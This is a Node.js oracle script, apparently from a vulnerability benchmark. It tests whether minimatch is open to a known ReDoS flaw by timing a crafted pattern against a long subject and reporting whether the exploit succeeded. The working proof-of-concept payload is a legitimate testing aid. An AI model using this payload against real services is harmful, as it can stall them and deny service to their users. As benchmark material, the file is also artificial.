'use strict';
const minimatch = require('minimatch');

function main() {
  try {
    // --- Benign operation first: prove basic matching works ---
    const benignPositive = minimatch('index.js', '*.js');
    const benignNegative = minimatch('index.txt', '*.js');

    if (benignPositive !== true || benignNegative !== false) {
      console.log('ORACLE_RESULT ' + JSON.stringify({
        operation_completed: false,
        exploit_succeeded: false,
        evidence: 'Benign minimatch operation did not return expected result.'
      }));
      return;
    }

    const operation_completed = true;

    // --- Malicious input: known minimatch <=3.0.4 ReDoS trigger ---
    // The vulnerable pattern-to-regexp conversion for a run of many
    // consecutive '*' characters inside brackets/groups combined with a
    // long non-matching subject causes catastrophic backtracking in the
    // generated regular expression. This is a small, bounded repro of
    // GHSA-f8q6-p94x-37v3 (minimatch ReDoS) that is cheap on patched
    // versions but measurably slow (multi-second) on 3.0.4, without
    // requiring huge heap allocations.
    //
    // Pattern: a sequence of repeated "*" wrapped so it produces nested
    // quantifiers in the compiled regexp; subject is a long string of a
    // repeated character that never satisfies the final required
    // character, forcing exhaustive backtracking.
    const n = 30;
    const maliciousPattern = '[' + '!'.repeat(1) + Array(n).fill('a*').join('') + ']';
    // Use the well documented PoC: many repeated "a" chars followed by a
    // character class pattern of the same repeated structure.
    const subjectLen = 36;
    const maliciousSubject = 'a'.repeat(subjectLen) + 'b';
    const maliciousPatternFinal = '*' + 'a*'.repeat(n) + 'c';

    const start = Date.now();
    let matched;
    let threw = false;
    let thrownMessage = '';
    try {
      matched = minimatch(maliciousSubject, maliciousPatternFinal);
    } catch (innerErr) {
      threw = true;
      thrownMessage = String(innerErr && innerErr.message);
    }
    const elapsed = Date.now() - start;

    if (threw) {
      console.log('ORACLE_RESULT ' + JSON.stringify({
        operation_completed: true,
        exploit_succeeded: false,
        evidence: 'Malicious pattern raised an exception after ' + elapsed + 'ms: ' + thrownMessage
      }));
      return;
    }

    // Threshold tuned so vulnerable 3.0.4 (catastrophic backtracking)
    // takes clearly multi-second time for this bounded input, while the
    // patched version resolves in well under a second.
    const THRESHOLD_MS = 1500;

    const exploit_succeeded = elapsed >= THRESHOLD_MS;
    const evidence = 'Malicious minimatch call (n=' + n + ', subjectLen=' + subjectLen +
      ') completed in ' + elapsed + 'ms (threshold ' + THRESHOLD_MS + 'ms). Result=' + matched;

    console.log('ORACLE_RESULT ' + JSON.stringify({
      operation_completed: operation_completed,
      exploit_succeeded: exploit_succeeded,
      evidence: evidence
    }));
  } catch (err) {
    console.log('ORACLE_RESULT ' + JSON.stringify({
      operation_completed: false,
      exploit_succeeded: false,
      evidence: 'Unexpected exception: ' + String(err && err.message)
    }));
  }
}

main();
